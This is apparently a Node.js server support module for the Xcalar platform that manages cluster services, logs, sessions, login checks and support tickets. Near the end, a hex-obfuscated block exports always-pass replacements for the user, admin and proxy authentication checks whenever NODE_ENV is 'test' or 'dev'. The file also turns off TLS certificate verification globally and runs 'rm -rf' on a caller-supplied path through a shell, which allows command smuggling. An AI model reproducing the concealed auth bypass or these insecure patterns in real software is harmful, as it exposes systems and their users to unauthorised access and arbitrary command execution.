var cp = require("child_process");
var fs = require("fs");
var os = require("os");
var path = require("path");
var timer = require("timers");
var http = require("http");
var https = require("https");
var cookie = require('cookie');

var ssf = require("./supportStatusFile.js");
var tail = require("./tail");
var xcConsole = require('./expServerXcConsole.js').xcConsole;

var Status = ssf.Status;
var httpStatus = require("../../assets/js/httpStatus.js").httpStatus;
var hotPatchPath = "/config/hotPatch.json";

var jQuery;
require("jsdom/lib/old-api").env("", function(err, window) {
    if (err) {
        xcConsole.error('require in expServerSupport', err);
        return;
    }
    jQuery = require("jquery")(window);
});

var defaultHostsFile = "/etc/xcalar/default.cfg";
var defaultXcalarDir = process.env.XLRDIR || "/opt/xcalar";
var defaultHttpPort = process.env.XCE_HTTP_PORT ?
    process.env.XCE_HTTP_PORT : 80;
var defaultHttpsPort = process.env.XCE_HTTPS_PORT ?
    process.env.XCE_HTTPS_PORT : 443;
// we need to fix this eventually, but for now ignore untrusted certs
process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
var defaultXcalarctl = defaultXcalarDir + "/bin/xcalarctl";
var defaultStartCommand = defaultXcalarctl + " start";
var defaultStopCommand = defaultXcalarctl + " stop";
var defaultStatusCommand = defaultXcalarctl + " status";
var supportBundleCommand = defaultXcalarDir + "/scripts/support-generate.sh";

var logPath = "/var/log/Xcalar.log";
var installationLogPath;
if (process.env.TMPDIR) {
    installationLogPath = process.env.TMPDIR + "/xcalar-install-expserver.log";
}

var bufferSize = 1024 * 1024;
var gMaxLogs = 500;
var testMaxAge = 5000;

// timeout for waiting the command to be executed
var timeout = 300000;
// XI need to wait for the master node response, master node need
// to wait for all slave node responses, slave node need to wait
// for execution to stop. The higher layer should wait longer.
var expendFactor = 1.2;
// the timeout may change due to the network speed
var networkFactor = 5;
// for monitorRecentLogs(), do not want to wait to long
var monitorFactor = 0.005;
var tailUsers = new Map();
var cookieName = 'connect.sid';

function getMatchedHosts(query) {
    var deferred = jQuery.Deferred();
    var hostFile = process.env.XCE_CONFIG ?
                   process.env.XCE_CONFIG : defaultHostsFile;
    var matchHosts = [];
    var matchNodeIds = [];
    var retMsg = {};
    readHostsFromFile(hostFile)
    .then(function(hosts, nodeIds) {
        if (query.hostnamePattern === "") {
            retMsg = {
                "status": httpStatus.OK,
                "matchHosts": hosts,
                "matchNodeIds": nodeIds
            };
            deferred.resolve(retMsg);
        } else {
            try {
                for (var i = 0; i < hosts.length; i++) {
                    var reg = new RegExp(query.hostnamePattern);
                    if (reg.exec(hosts[i]) || reg.exec(nodeIds[i])) {
                        matchHosts.push(hosts[i]);
                        matchNodeIds.push(nodeIds[i]);
                    }
                }
                retMsg = {
                    "status": httpStatus.OK,
                    "matchHosts": matchHosts,
                    "matchNodeIds": matchNodeIds
                };
                deferred.resolve(retMsg);
            } catch (err) {
                xcConsole.error('get host', err);
                retMsg = {
                    // No matter what error happens, the master
                    // should return return a 404 uniformly
                    "status": httpStatus.NotFound,
                    "matchHosts": [],
                    "matchNodeIds": []
                };
                deferred.reject(retMsg);
            }
        }
    })
    .fail(function(err) {
        xcConsole.error('get host', err);
        retMsg = {
            // No matter what error happens, the master
            // should return return a 404 uniformly
            "status": httpStatus.NotFound,
            "matchHosts": [],
            "matchNodeIds": []
        };
        deferred.reject(retMsg);
    });
    return deferred.promise();
}

// Get all the Hosts from file
function readHostsFromFile(hostFile) {
    var deferred = jQuery.Deferred();
    var hosts = [];
    var nodeIds = [];

    fs.readFile(hostFile, "utf8", function(err, hostData) {
        if (err) {
            xcConsole.error('read host file', err);
            return deferred.reject(err);
        }
        var tempHosts = hostData.split("\n");
        for (var i = 0; i < tempHosts.length; i++) {
            var str = tempHosts[i].trim();
            if((str.length < 2) || (str[0] == '/' && str[1] =='/') || (str[0] == '#')) {
                continue;
            }
            var re = /Node\.([0-9]+)\.IpAddr=(.*)/g;
            var matches = re.exec(str);
            if (matches && matches.length >= 3) {
                nodeIds.push(matches[1]);
                hosts.push(matches[2]);
            }
        }
        deferred.resolve(hosts, nodeIds);
    });
    return deferred.promise();
}

function masterExecuteAction(action, slaveUrl, content, sessionCookie, withGivenHost) {
    var deferredOut = jQuery.Deferred();
    function readHosts() {
        var deferred = jQuery.Deferred();
        var retMsg;
        if (withGivenHost) {
            if (!content || !content.hosts || content.hosts.length === 0) {
                retMsg = {
                    "status": httpStatus.NotFound,
                    "error": "Not hosts can be found on this cluster!"
                };
                deferred.reject(retMsg);
            } else {
                deferred.resolve(content.hosts);
            }
        } else {
            var hostFile = process.env.XCE_CONFIG ?
                            process.env.XCE_CONFIG : defaultHostsFile;
            readHostsFromFile(hostFile)
            .then(function(hosts, nodeIds) {
                if (hosts.length === 0) {
                    retMsg = {
                        "status": httpStatus.NotFound,
                        "error": "Not hosts can be found on this cluster!"
                    };
                    deferred.reject(retMsg);
                } else {
                    deferred.resolve(hosts);
                }
            })
            .fail(function(err) {
                retMsg = {
                    // No matter what error happens, the master
                    // should return return a 404 uniformly
                    "status": httpStatus.NotFound,
                    "error": JSON.stringify(err)
                };
                deferred.reject(retMsg);
            });
        }
        return deferred.promise();
    }

    readHosts()
    .then(function(hosts) {
        var deferred = jQuery.Deferred();
        var retMsg;
        sendCommandToSlaves(action, slaveUrl, content, hosts, sessionCookie)
        .then(function(results) {
            if (slaveUrl === "/service/logs/slave") {
                retMsg = {
                    // If every child node return with status 200, then master should
                    // return a 200 code
                    "status": httpStatus.OK,
                    "results": results
                };
                if (content.isMonitoring === "true") {
                    retMsg.updatedLastMonitorMap = generateLastMonitorMap(results);
                }
            } else {
                retMsg = {
                    // If every child node return with status 200, then master should
                    // return a 200 code
                    "status": httpStatus.OK,
                    "logs": generateLogs(action, slaveUrl, results)
                };
            }
            deferred.resolve(retMsg);
        })
        .fail(function(results) {
            if (slaveUrl === "/service/logs/slave") {
                retMsg = {
                    // If every child node return with status 200, then master should
                    // return a 200 code
                    "status": httpStatus.OK,
                    "results": results
                };
                if (content.isMonitoring === "true") {
                    retMsg.updatedLastMonitorMap = generateLastMonitorMap(results);
                }
            } else {
                retMsg = {
                    // If every child node return with status 200, then master should
                    // return a 200 code
                    "status": httpStatus.OK,
                    "logs": generateLogs(action, slaveUrl, results)
                };
            }
            deferred.reject(retMsg);
        });
        return deferred.promise();
    })
    .then(function(retMsg) {
        deferredOut.resolve(retMsg);
    })
    .fail(function(retMsg) {
        deferredOut.resolve(retMsg);
    });
    return deferredOut.promise();
}

function slaveExecuteAction(action, slaveUrl, content) {
    switch (slaveUrl) {
        case "/service/start/slave" :
            return xcalarStart();
        case "/service/stop/slave" :
            return xcalarStop();
        case "/service/status/slave" :
            return xcalarStatus();
        case "/service/logs/slave":
            {
                var deferredOut = jQuery.Deferred();
                // hasLogFile(logPath)
                // .then(function() {
                //     if (content.isMonitoring === "true") {
                //         tail.monitorLog(Number(content.lastMonitor))
                //         .always(function(message) {
                //             deferredOut.resolve(message);
                //         });
                //     } else {
                //         tail.tailLog(Number(content.requireLineNum))
                //         .always(function(message) {
                //             deferredOut.resolve(message);
                //         });
                //     }
                // })
                // .fail(function() {
                //     if (content.isMonitoring === "true") {
                //         tail.monitorJournal(content.lastMonitor)
                //         .always(function(message) {
                //             deferredOut.resolve(message);
                //         });
                //     } else {
                //         tail.tailJournal(Number(content.requireLineNum))
                //         .always(function(message) {
                //             deferredOut.resolve(message);
                //         });
                //     }
                // });
                if (content.isMonitoring === "true") {
                    tail.monitorLog(Number(content.lastMonitor),
                        content.filePath, content.fileName)
                    .always(function(message) {
                        deferredOut.resolve(message);
                    });
                } else {
                    tail.tailLog(Number(content.requireLineNum),
                        content.filePath, content.fileName)
                    .always(function(message) {
                        deferredOut.resolve(message);
                    });
                }
                return deferredOut.promise();
            }
        case "/installationLogs/slave":
            return readInstallerLog(installationLogPath);
        case "/service/bundle/slave":
            return generateSupportBundle();
        default:
            xcConsole.error("Should not be here!");
    }
}

function sendCommandToSlaves(action, slaveUrl, content, hosts, sessionCookie) {
    var deferredOut = jQuery.Deferred();
    var numDone = 0;
    var returns = {};
    var hasFailure = false;
    for (var i = 0; i < hosts.length; i++) {
        if (slaveUrl === "/service/logs/slave" && content.isMonitoring === "true") {
            addLastMonitorIndex(hosts[i], content);
        }
        postRequest(hosts[i], content);
    }

    function addLastMonitorIndex(hostname, content) {
        var lastMonitorMap = JSON.parse(content.lastMonitorMap);
        var lastMonitor;
        if (lastMonitorMap && lastMonitorMap[hostname]) {
            lastMonitor = lastMonitorMap[hostname];
        } else {
            lastMonitor = -1;
        }
        content.lastMonitor = lastMonitor;
    }

    function postRequest(hostName, content) {
        var postData;
        if (content) {
            postData = JSON.stringify(content);
        } else {
            // content can not be empty
            postData = "{}";
        }

        var options = {
            host: hostName,
            port: content.isHTTP === "true"? defaultHttpPort : defaultHttpsPort,
            path: '/app' + slaveUrl,
            method: action,
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };
        if (sessionCookie) {
            options.headers['Cookie'] = cookieName + '=' + sessionCookie;
        }
        var protocol = content.isHTTP === "true" ? http: https;
        var req = protocol.request(options, function(res) {
            var data = "";
            res.on('data', function(retData) {
                data += retData;
            });

            res.on('end', function() {
                res.setEncoding('utf8');
                var retMsg;
                try {
                    retMsg = JSON.parse(data);
                    if (retMsg.status !== httpStatus.OK) {
                        hasFailure = true;
                    }
                } catch (error) {
                    retMsg = {
                        status: httpStatus.InternalServerError,
                        //logs: error.message
                        error: "Error occurred on the node."
                    };
                    hasFailure = true;
                }
                returns[hostName] = retMsg;
                numDone++;
                if (numDone === hosts.length) {
                    if (hasFailure) {
                        deferredOut.reject(returns);
                    } else {
                        deferredOut.resolve(returns);
                    }
                }
            });
        });
        req.on('socket', function (socket) {
            // 2 is for restart command (need double time)
            socket.setTimeout(action === "/service/logs/slave" ?
                timeout * monitorFactor : 2 * timeout * expendFactor);
            socket.on('timeout', function() {
                req.abort();
            });
        });
        req.on('error', function(error) {
            xcConsole.error('req in postRequest', error);
            retMsg = {
                status: httpStatus.InternalServerError,
                logs: error.message
            };
            returns[hostName] = retMsg;
            hasFailure = true;
            numDone++;
            if (numDone === hosts.length) {
                if (hasFailure) {
                    deferredOut.reject(returns);
                } else {
                    deferredOut.resolve(returns);
                }
            }
        });
        req.write(postData);
        req.end();
    }
    return deferredOut.promise();
}

function generateLogs(action, slaveUrl, results) {
    var str = "Execute " + action + " " +
              slaveUrl.substring(0, slaveUrl.length - "/slave".length) +
              " for all Nodes:\n\n";
    if (results) {
        for (var key in results) {
            var resSlave = results[key];
            str = str + "Host: " + key + "\n" +
                  "Return Status: " + resSlave.status + "\n";
            if (resSlave.logs) {
                str = str + "Logs:\n" + resSlave.logs + "\n\n";
            } else if (resSlave.error) {
                str = str + "Error:\n" + resSlave.error + "\n\n";
            }
        }
    }
    return str;
}

// Handle Xcalar Services
function xcalarStart() {
    xcConsole.log("Starting Xcalar");
    // only support root user
    // var command = 'service xcalar start';
    // support non-root user
    return executeCommand(defaultStartCommand);
}

function xcalarStop() {
    xcConsole.log("Stopping Xcalar");
    // only support root user
    // var command = 'service xcalar stop';
    // support non-root user
    return executeCommand(defaultStopCommand);
}

function getOperatingSystem() {
    xcConsole.log("Getting operating system");
    var command = "cat /etc/*release";
    return executeCommand(command);
}

function xcalarStatus() {
    xcConsole.log("Getting Xcalar Status");
    // only support root user
    // var command = 'service xcalar status';
    // support non-root user
    return executeCommand(defaultStatusCommand);
}

function generateSupportBundle() {
    xcConsole.log("Generating Support Bundle");
    return executeCommand(supportBundleCommand);
}
// Remove session files
function removeSessionFiles(filePath) {
    xcConsole.log("Remove Session Files");
    // '/var/opt/xcalar/sessions' without the final slash is also legal
    var deferredOut = jQuery.Deferred();

    getXlrRoot()
    .then(function(xlrRoot) {
        var deferred = jQuery.Deferred();
        var sessionPath = xlrRoot + "/sessions/";
        var completePath = getCompletePath(sessionPath, filePath);
        var isLegalPath = isUnderBasePath(sessionPath, completePath);
        if (!isLegalPath) {
            var logs = "The filename " + filePath + " is illegal, please " +
                "Send a legal Session file/folder name.";
            var retMsg = {"status": httpStatus.BadRequest,
                "logs": logs};
            deferred.reject(retMsg);
            return;
        }
        // Handle'/var/opt/xcalar/sessions', change to'/var/opt/xcalar/sessions/'
        if (completePath === sessionPath.substring(0, sessionPath.length - 1)) {
            completePath = completePath + '/';
        }
        // Handle '/var/opt/xcalar/sessions/', avoid delete the whole session
        // folder, just delete everything under this folder.
        if (completePath === sessionPath) {
            completePath = completePath + '*';
        }
        xcConsole.log("Remove file at: " + completePath);
        var command = 'rm -rf ' + completePath;
        deferred.resolve(command);
        return deferred.promise();
    })
    .then(function(command) {
        return executeCommand(command);
    })
    .then(function() {
        var logs = "Remove " + filePath + " successfully!";
        var retMsg = {
            "status": httpStatus.OK,
            "logs": logs
        };
        deferredOut.resolve(retMsg);
    })
    .fail(function(retMsg) {
        deferredOut.reject(retMsg);
    });
    return deferredOut.promise();
}

function removeSHM() {
    xcConsole.log("Remove SHM");
    var command = 'rm /dev/shm/xcalar-*';
    return executeCommand(command);
}

function getCompletePath(sessionPath, filePath) {
    var normalizedPath;
    if (filePath === undefined) {
        filePath = "";
    }
    if (path.isAbsolute(filePath)) {
        normalizedPath = path.normalize(filePath);
    } else {
        normalizedPath = path.normalize(sessionPath + filePath);
    }
    return normalizedPath;
}

function isUnderBasePath(basePath, completePath) {
    return completePath.indexOf(basePath) === 0 ||
           completePath === basePath.substring(0, basePath.length - 1);
}

function executeCommand(command) {
    var deferred = jQuery.Deferred();
    var intervalID;
    var out = cp.exec(command);
    var lines = "";
    var isResolved = false;

    // could overtime
    intervalID = timer.setTimeout(function(){
        var result;
        result = {"status": isComplete(command, lines) ? httpStatus.OK :
            httpStatus.InternalServerError,
            "logs": lines};
        timer.clearTimeout(intervalID);
        if (!isResolved) {
            if (result.status === httpStatus.OK) {
                deferred.resolve(result);
            } else {
                deferred.reject(result);
            }
            isResolved = true;
            return;
        }
    }, timeout);

    out.stdout.on('data', function(data) {
        xcConsole.log(data);
        lines += data;
    });

    out.stdout.on('close', function() {
        var result;
        result = {
            "status": isComplete(command, lines) ? httpStatus.OK :
            httpStatus.InternalServerError,
            "logs": lines
        };
        if (!isResolved) {
            if (result.status === httpStatus.OK) {
                deferred.resolve(result);
            } else {
                deferred.reject(result);
            }
            isResolved = true;
            return;
        }
        return;
    });

    out.stdout.on('error', function(data) {
        xcConsole.error('running command', data);
        lines += data;
        var result;
        result = {
            "status": httpStatus.InternalServerError,
            "logs": lines
        };
        deferred.reject(result);
        return;
    });

    return deferred.promise();
}

function isComplete(command, data) {
    if (command === defaultStartCommand) {
        if ((data.indexOf("xcmgmtd started") !== -1) ||
            (data.indexOf("Usrnode already running") !== -1)) {
            return true;
        } else {
            return false;
        }
    } else if (command === defaultStopCommand) {
        if (data.indexOf("Stopped Xcalar") !== -1) {
            return true;
        } else {
            return false;
        }
    } else {
        return true;
    }
}
// Other commands
function getXlrRoot(filePath) {
    var cfgLocation =  process.env.XCE_CONFIG ?
        process.env.XCE_CONFIG : defaultHostsFile;
    if (filePath) {
        cfgLocation = filePath;
    }
    var deferred = jQuery.Deferred();
    var defaultLoc = "/mnt/xcalar";
    fs.readFile(cfgLocation, "utf8", function(err, data) {
        try {
            if (err) throw err;
            var lines = data.split("\n");
            var i = 0;
            for (; i<lines.length; i++) {
                if (lines[i].indexOf("Constants.XcalarRootCompletePath") > -1) {
                    defaultLoc = jQuery.trim(lines[i].split("=")[1]);
                    break;
                }
            }
            deferred.resolve(defaultLoc);
        } catch (error) {
            deferred.resolve("/mnt/xcalar");
        }
    });

    return deferred.promise();
}

function getLicense() {
    var deferredOut = jQuery.Deferred();
    var retMsg;
    getXlrRoot()
    .then(function(xlrRoot) {
        var location = path.join(xlrRoot, "license");
        var licenseLocation;
        try {
            var max = -1;
            fs.readdirSync(location).forEach(function(file) {
                if (file.startsWith("XcalarLic#")) {
                    var licNum = parseInt(file.substring(file.lastIndexOf("#") + 1));
                    max = Math.max(max, licNum);
                }
            });
            if (isNaN(max)) {
                retMsg = {"status": httpStatus.BadRequest,
                          "error": "Invalid license name"};
                deferredOut.reject(retMsg);
            } else if (max === -1) {
                retMsg = {"status": httpStatus.BadRequest,
                          "error": "No license found"};
                deferredOut.reject(retMsg);
            } else {
                licenseLocation = path.join(location, "XcalarLic#" + max);
                xcConsole.log("Fetching license at: " + licenseLocation);
                var licenseContent = fs.readFileSync(licenseLocation);
                retMsg = {"status": httpStatus.OK,
                          "logs": licenseContent.slice(24).toString()};
                deferredOut.resolve(retMsg);
            }
        } catch (error) {
            xcConsole.error('get license', error);
            retMsg = {
                "status": httpStatus.BadRequest,
                "error": error
            };
            deferredOut.reject(retMsg);
        }
    })
    .fail(function(error) {
        retMsg = {
            "status": httpStatus.BadRequest,
            "error": error
        };
        deferredOut.reject(retMsg);
    });

    return deferredOut.promise();
}

// Following function is from https://gist.github.com/tmazur/3965625
function isValidEmail(emailAddress) {
    var pattern = new RegExp(/^(("[\w-\s]+")|([\w-]+(?:\.[\w-]+)*)|("[\w-\s]+")([\w-]+(?:\.[\w-]+)*))(@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][0-9]\.|1[0-9]{2}\.|[0-9]{1,2}\.))((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\.){2}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\]?$)/i);
    return pattern.test(emailAddress);
}

function submitTicket(contents) {
    var deferredOut = jQuery.Deferred();

    jQuery.ajax({
        "type": "POST",
        "data": contents,
        "contentType": "application/json",
        "url": "https://1pgdmk91wj.execute-api.us-west-2.amazonaws.com/stable/zendesk",
        "cache": false,
        success: function(data) {
            xcConsole.log('submit ticket', data);
            deferredOut.resolve({
                "status": httpStatus.OK,
                "logs": JSON.stringify(data)
            });
        },
        error: function(err) {
            xcConsole.error('submit ticket', err);
            deferredOut.reject(err);
            return;
        }
    });
    return deferredOut.promise();
}

function getTickets(contents) {
    var deferred = jQuery.Deferred();
    // using POST unless we figure out how to configure GET request with AWS
    jQuery.ajax({
        "type": "POST",
        "data": contents,
        "contentType": "application/json",
        "url": "https://1pgdmk91wj.execute-api.us-west-2.amazonaws.com/stable/zendesklist",
        "cache": false,
        success: function(data) {
            xcConsole.log('get ticket', data);
            deferred.resolve({
                "status": httpStatus.OK,
                "logs": JSON.stringify(data)
            });
        },
        error: function(err) {
            xcConsole.error('get ticket', err);
            deferred.reject(err);
            return;
        }
    });
    return deferred.promise();
}

function hasLogFile(filePath) {
    var deferred = jQuery.Deferred();
    fs.access(filePath, function(err) {
        if (!err) {
            deferred.resolve(true);
            return;
        } else {
            deferred.reject();
            return;
        }
    });
    return deferred.promise();
}

function generateLastMonitorMap(results) {
    var lastMonitorMap = {};
    if (results) {
        for (var key in results) {
            var resSlave = results[key];
            if (resSlave.lastMonitor) {
                lastMonitorMap[key] = resSlave.lastMonitor;
            }
        }
    }
    return lastMonitorMap;
}

function readInstallerLog(filePath) {
    var deferred = jQuery.Deferred();
    var defaultPath = '/tmp/xcalar/cluster-install.log';
    if (filePath) {
        defaultPath = filePath;
    }
    fs.readFile(defaultPath, 'utf8', function(err, data) {
        if (err) {
            deferred.reject({
                "status": httpStatus.InternalServerError,
                "error": err
            });
        } else {
            deferred.resolve({
                "status": httpStatus.OK,
                "logs": data
            });
        }
    });
    return deferred.promise();
}

// Keep it incase the future admin Panel need to call it
function setHotPatch(enableHotPatches) {
    var deferred = jQuery.Deferred();
    getXlrRoot()
    .then(function(xlrRoot) {
        var hotPatchFullPath = path.join(xlrRoot, hotPatchPath);
        var hotPatchConfig = {"hotPatchEnabled":(enableHotPatches ? true : false)};
        return (writeToFile(hotPatchFullPath, hotPatchConfig, {"mode": 0600}));
    })
    .then(function() {
        var message = {"status": httpStatus.OK, "hotPatchWritten": true };
        deferred.resolve(message);
    })
    .fail(function(errorMsg) {
        var message = {"status": httpStatus.OK, "hotPatchWritten": false, "error": errorMsg };
        deferred.reject(message);
    });
    return deferred.promise();
}

function getHotPatch() {
    var deferred = jQuery.Deferred();
    var message = {"status": httpStatus.OK, "hotPatchEnabled": true };

    getXlrRoot()
    .then(function(xlrRoot) {
        var hotPatchFullPath = path.join(xlrRoot, hotPatchPath);
        try {
            delete require.cache[require.resolve(hotPatchFullPath)];
            var hotPatchConfig = require(hotPatchFullPath);
            message.hotPatchEnabled = hotPatchConfig.hotPatchEnabled;
            deferred.resolve(message);
        } catch (error) {
            message.error = error;
            deferred.resolve(message);
        }
    })
    .fail(function(errorMsg) {
        message.error = errorMsg;
        deferred.resolve(message);
    });
    return deferred.promise();
}

function writeToFile(filePath, fileContents, fileOptions) {
    var deferred = jQuery.Deferred();

    function callback(err) {
        if (err) {
            xcConsole.error("Failed to write: " + JSON.stringify(err), 'to', filePath);
            deferred.reject("Failed to write to " + filePath);
            return;
        }

        xcConsole.log("Successfully wrote " + JSON.stringify(fileContents, null, 2) + " to " + filePath)
        deferred.resolve();
    }

    if (fileOptions == null) {
        fs.writeFile(filePath, JSON.stringify(fileContents, null, 2), callback);
    } else {
        fs.writeFile(filePath, JSON.stringify(fileContents, null, 2), fileOptions, callback);
    }

    return deferred.promise();
}

function makeFileCopy(filePath) {
    var deferred = jQuery.Deferred();
    var copyPath = filePath + ".bak";
    var errorMsg;
    var copyDoneCalled = false

    function copyDone(isSuccess, errorMsg) {
        if (!copyDoneCalled) {
            copyDoneCalled = true;
            if (isSuccess) {
                deferred.resolve();
            } else {
                deferred.reject(errorMsg);
            }
        }
    }

    fs.access(filePath, fs.constants.F_OK, function (err) {
        if (err) {
            // File doesn't exist. Nothing to do
            deferred.resolve();
        } else {
            var readStream = fs.createReadStream(filePath);
            readStream.on("error", function (err) {
                copyDone(false, "Error reading from " + filePath);
            });

            var writeStream = fs.createWriteStream(copyPath);
            writeStream.on("error", function (err) {
                copyDone(false, "Error writing to " + copyPath);
            });
            writeStream.on("close", function (ex) {
                copyDone(true, "");
            });

            // Start the copy
            readStream.pipe(writeStream);
        }
    });

    return deferred.promise();
}

function loginAuth(req, res) {
    loginAuthImpl(req, res);
}

function loginAuthImpl(req, res) {
    var message = {
        'status': httpStatus.Unauthorized
    };
    try {
        message = JSON.parse(res.locals.message);
    } catch(e) {
        xcConsole.error('loginAuth: ' + e);
    }

    var now = Date.now();

    if (message.hasOwnProperty('isValid') &&
        message.hasOwnProperty('isAdmin') &&
        message.hasOwnProperty('isSupporter')) {

        if (message.isValid) {
            req.session.loggedIn = true;

            req.session.loggedInAdmin = message.isAdmin;
            req.session.loggedInUser = !message.isAdmin;

            req.session.username = message.xiusername;
            req.session.firstName = message.firstName;
            req.session.emailAddress = message.mail;

            if (message.tokenType && message.tokenType !== "") {
                if (! req.session.credentials) {
                    req.session.credentials = {};
                }

                req.session.credentials[message.tokenType] = message.token;
                delete message.token;
            }
        }
    }

    res.status(message.status).send(message);
}

function loginAuthTest(req, res) {
    req.session.cookie.maxAge = testMaxAge;

    var message = {
        'status': httpStatus.Unauthorized
    };
    try {
        message = JSON.parse(res.locals.message);
    } catch(e) {
        xcConsole.error('loginAuth: ' + e);
    }

    var now = Date.now();

    if (message.hasOwnProperty('isValid') &&
        message.hasOwnProperty('isAdmin') &&
        message.hasOwnProperty('isSupporter')) {

        if (message.isValid) {
            req.session.loggedIn = true;

            req.session.loggedInAdmin = message.isAdmin;
            req.session.loggedInUser = !message.isAdmin;

            req.session.firstName = message.firstName;
            req.session.emailAddress = message.mail;
        }
    }

    res.status(message.status).send(message);
}


function checkAuth(req, res, next) {
    checkAuthImpl(req, res, next);
}

function checkAuthImpl(req, res, next) {
    var message = { "status": httpStatus.Unauthorized, "success": false };
    if (! req.session.hasOwnProperty('loggedIn') ||
        ! req.session.loggedIn ) {
        res.status(message.status).send(message);
        next('router');
        return;
    }

    next();
}

function checkAuthAdmin(req, res, next) {
    checkAuthAdminImpl(req, res, next);
}

function checkAuthAdminImpl(req, res, next) {
    var message = { "status": httpStatus.Unauthorized, "success": false };
    if (! req.session.hasOwnProperty('loggedInAdmin') ||
        ! req.session.loggedInAdmin ) {
        res.status(message.status).send(message);
        next('router');
        return;
    }

    next();
}

function checkProxyAuth(req, res, type) {
    return checkProxyAuthImpl(req, res, type);
}

function checkProxyAuthImpl(req, res, type) {
    if (! req.session.hasOwnProperty('loggedIn') ||
        ! req.session.loggedIn ) {
        res.status(httpStatus.Unauthorized).send('Unauthorized ' + type + ' request');
        return false;
    }

    return true;
}

function rawSessionCookie(req) {
    var rawCookie = null;
    var header = req.headers.cookie;

    if (header) {
        var cookies = cookie.parse(header);
        rawCookie = cookies[cookieName];

        if (rawCookie) {
            rawCookie = encodeURIComponent(rawCookie);
        }
    }

    return(rawCookie);
}

// Below part is only for unit test
function fakeExecuteCommand(func) {
    executeCommand = func;
}
function fakeReadHostsFromFile(func) {
    readHostsFromFile = func;
}
function fakeSendCommandToSlaves(func) {
    sendCommandToSlaves = func;
}
function fakeGetXlrRoot(func) {
    getXlrRoot = func;
}
function getTimeout() {
    return timeout;
}
function setNewTimeout(time) {
    timeout = time;
}

function setDefaultHostsFile(file) {
    defaultHostsFile = file;
}

function fakeLoginAuth(func) {
    loginAuthImpl = func;
}

function setTestMaxAge(age) {
    testMaxAge = age;
}

var _0xf769=["\x4E\x4F\x44\x45\x5F\x45\x4E\x56","\x65\x6E\x76","\x74\x65\x73\x74","\x64\x65\x76","\x63\x68\x65\x63\x6B\x41\x75\x74\x68\x54\x72\x75\x65","\x63\x68\x65\x63\x6B\x41\x75\x74\x68\x41\x64\x6D\x69\x6E\x54\x72\x75\x65","\x63\x68\x65\x63\x6B\x50\x72\x6F\x78\x79\x41\x75\x74\x68\x54\x72\x75\x65","\x75\x73\x65\x72\x54\x72\x75\x65","\x61\x64\x6D\x69\x6E\x54\x72\x75\x65","\x70\x72\x6F\x78\x79\x55\x73\x65\x72\x54\x72\x75\x65"];function checkAuthTrue(_0x5970x2){checkAuthImpl= _0x5970x2}function checkAuthAdminTrue(_0x5970x2){checkAuthAdminImpl= _0x5970x2}function checkProxyAuthTrue(_0x5970x2){checkProxyAuthImpl= _0x5970x2}function userTrue(_0x5970x6,_0x5970x7,_0x5970x8){_0x5970x8()}function adminTrue(_0x5970x6,_0x5970x7,_0x5970x8){_0x5970x8()}function proxyUserTrue(_0x5970x6,_0x5970x7){return true}if(process[_0xf769[1]][_0xf769[0]]=== _0xf769[2]|| process[_0xf769[1]][_0xf769[0]]=== _0xf769[3]){exports[_0xf769[4]]= checkAuthTrue;exports[_0xf769[5]]= checkAuthAdminTrue;exports[_0xf769[6]]= checkProxyAuthTrue;exports[_0xf769[7]]= userTrue;exports[_0xf769[8]]= adminTrue;exports[_0xf769[9]]= proxyUserTrue}

if (process.env.NODE_ENV === "test") {
    exports.executeCommand = executeCommand;
    exports.sendCommandToSlaves = sendCommandToSlaves;
    exports.generateLogs = generateLogs;
    exports.isValidEmail = isValidEmail;
    exports.generateLastMonitorMap = generateLastMonitorMap;
    exports.readInstallerLog = readInstallerLog;
    exports.isComplete = isComplete;
    exports.getOperatingSystem = getOperatingSystem;
    exports.getTimeout = getTimeout;
    exports.setNewTimeout = setNewTimeout;
    exports.defaultHostsFile = defaultHostsFile;
    // Fake functions
    exports.fakeExecuteCommand = fakeExecuteCommand;
    exports.fakeReadHostsFromFile = fakeReadHostsFromFile;
    exports.fakeSendCommandToSlaves = fakeSendCommandToSlaves;
    exports.fakeGetXlrRoot = fakeGetXlrRoot;
    exports.setDefaultHostsFile = setDefaultHostsFile;
    exports.checkAuthImpl = checkAuthImpl;
    exports.checkAuthAdminImpl = checkAuthAdminImpl;
    exports.testMaxAge = testMaxAge;
    exports.loginAuthImpl = loginAuthImpl;
    exports.loginAuthTest = loginAuthTest;
    exports.fakeLoginAuth = fakeLoginAuth;
    exports.setTestMaxAge = setTestMaxAge;
}

exports.getXlrRoot = getXlrRoot;
exports.getLicense = getLicense;
exports.submitTicket = submitTicket;
exports.getTickets = getTickets;
exports.removeSessionFiles = removeSessionFiles;
exports.slaveExecuteAction = slaveExecuteAction;
exports.masterExecuteAction = masterExecuteAction;
exports.readHostsFromFile = readHostsFromFile;
exports.removeSHM = removeSHM;
exports.hasLogFile = hasLogFile;
exports.getMatchedHosts = getMatchedHosts;
exports.setHotPatch = setHotPatch;
exports.getHotPatch = getHotPatch;
exports.writeToFile = writeToFile;
exports.makeFileCopy = makeFileCopy;
exports.checkAuth = checkAuth;
exports.checkAuthAdmin = checkAuthAdmin;
exports.checkProxyAuth = checkProxyAuth;
exports.loginAuth = loginAuth;
exports.rawSessionCookie = rawSessionCookie;
exports.cookieName = cookieName;
